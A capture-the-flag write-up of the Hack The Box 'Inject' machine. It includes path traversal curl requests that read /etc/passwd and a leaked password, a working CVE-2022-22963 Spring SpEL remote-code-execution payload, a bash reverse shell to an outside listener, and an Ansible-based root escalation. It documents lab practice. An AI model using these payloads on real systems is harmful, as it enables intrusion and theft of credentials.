*2023-07-02*

#ctf-writeup 

> [!Abstract]
> This writeup is for the Inject HTB machine. It's labelled an easy Linux box, and it was picked as an opportunity to brush up on my rusty HTB skills.
> 
> ![[../Files/Pasted image 20230702232240.png]]

---

## Enumeration
After running Nmap we can see that only ports `22` and `8080` are open.

```sh
nmap -vv -sV -sC -p- -A -oN full 10.10.11.204
```

```
# Nmap 7.94 scan initiated Sun Jul  2 20:40:06 2023 as: nmap -vv -sV -sC -p- -A -oN full 10.10.11.204
Nmap scan report for 10.10.11.204
Host is up, received conn-refused (0.079s latency).
Scanned at 2023-07-02 20:40:07 MDT for 48s
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  2 20:40:55 2023 -- 1 IP address (1 host up) scanned in 48.71 seconds
```

Navigating to http://10.10.11.204:8080/ shows that port `8080` is running a web server for "Zodd Cloud".

![[../Files/Pasted image 20230702232637.png]]

There is an [upload](http://10.10.11.204:8080/upload) page allows us to upload an image, which can then be viewed using the [show_image](http://10.10.11.204:8080/show_image) endpoint. Fortunately for us, this endpoint takings the get parameter `img` which has a path traversal vulnerability. We can use this to read `/etc/passwd` and many other files on the box.

```sh
❯ curl http://10.10.11.204:8080/show_image\?img\=../../../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

> [!Note]
> Two users stand out here, `frank` and `phil`.

In `frank`'s home directory, we also found a `settings.xml` file that contained a password for `phil`. Trying to SSH into both `frank` and `phil` with this password didn't prove to be successful.

```sh
❯ curl http://10.10.11.204:8080/show_image\?img\=../../../../../../home/frank/.m2/settings.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Using this path traversal we can also read `pom.xml`. This lets us get the Maven dependencies running on the web application. This is useful because we can look for any vulnerable versions that might be used.

```sh
❯ curl http://10.10.11.204:8080/show_image\?img\=../../../pom.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

Here we can see the dependency `org.springframework.cloud`, version 3.2.2. This package is vulnerable to [CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963). This CVE allows you to send a specially crafted [SpEL](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html) that allows for remote code execution.

As a proof of concept, I was able to create a file at `/tmp/test` by running the following payload ([source](https://github.com/darryk10/CVE-2022-22963)):

```sh
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```

## Reverse shell
Spawning a reverse shell was difficult. Most of my attempts to run payloads within the `exec()` method failed to work. For some reason, any time I tried to run a command with flags the payload would stop working.

> [!Tip]
> I eventually tried a payload that sent the commands in as an array of type `String[]`, and for whatever reason that seemed to do the trick.

**Working payload**
```sh
❯ curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/10.10.14.15/4242 0>&1"}, null, null)' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```

**Listener**
```sh
❯ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.204] 32852
bash: cannot set terminal process group (796): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ 
```

> [!success]
> By using the payload `new String[]{"bash","-c","bash -i >& /dev/tcp/10.10.14.15/4242 0>&1"` we were able to get a reverse shell as `frank`!

## Lateral privilege escalation
We can improve our shell by directing our public key into `frank`'s `authorized_keys` file and logging in through SSH.

```sh
frank@inject:/$ mkdir -p /home/frank/.ssh
frank@inject:/$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMo7CzQ69kAt3fBTdvZjhZHecnul1hFH6ex8MhJ9cl7Q hacks-n-snacks' >> /home/frank/.ssh/authorized_keys
```

```sh
❯ ssh frank@10.10.11.204
frank@inject:~$ 
```

From here the lateral move was quite simple. All we needed to do was `su` into the `phil` user. This is where the password `DocPhillovestoInject123` we found earlier in `settings.xml` comes in handy.

```sh
frank@inject:~$ su - phil
Password: 
phil@inject:~$ whoami
phil
```

> [!Success]
> We can find the `user.txt` flag in `phil`'s home directory!
> ```sh
> phil@inject:~$ ls
> user.txt
> ```

## Privilege escalation to root
Now that we are `phil` we can work on the privesc to the `root` user.

In the `/opt/automation/tasks` directory, there is an Ansible playbook file that has a single task used to check to make sure the web app is running. The directory is owned by the `staff` group, which coincidentally `phil` is a user of, meaning we can write our own files.

```sh
phil@inject:/opt/automation$ ls -la
total 12
drwxr-xr-x 3 root root  4096 Oct 20  2022 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
drwxrwxr-x 2 root staff 4096 Jul  3 06:08 tasks
phil@inject:/opt/automation$ groups
phil staff
```

I added my own Ansible playbook file which was then eventually run by a `root` service, likely running as a cron job. The tasks in the playbook were configured to copy the `root.txt` flag from the `/root` directory to a location that `phil` could read.

```sh
phil@inject:/opt/automation/tasks$ mkdir -p /tmp/hacks-n-snacks
phil@inject:/opt/automation/tasks$ vim copy-flag.yml
```

```yml
- hosts: localhost
  tasks:
  - name: Copy root flag 
    ansible.builtin.copy: 
      src: /root/root.txt 
      dest: /tmp/hacks-n-snacks/root.txt
```

> [!Success]
> After a minute or so the Ansible playbook was run and the `root.txt` flag was ours!
> ```sh
> phil@inject:/tmp/snacks-n-hacks$ ls
> root.txt
> ```

---

## Conclusion
I enjoyed working through this box. I found the steps to get a reverse shell more challenging than some of the other easy Hack The Box boxes I've completed, but it was not so challenging that I felt stuck. 

Some of my past DevOps experience made the privesc to `root` using Ansible quite straightforward, so that was encouraging. This was a great box to get back into the swing of things with HTB, and it felt great to root it in a single sitting.

---
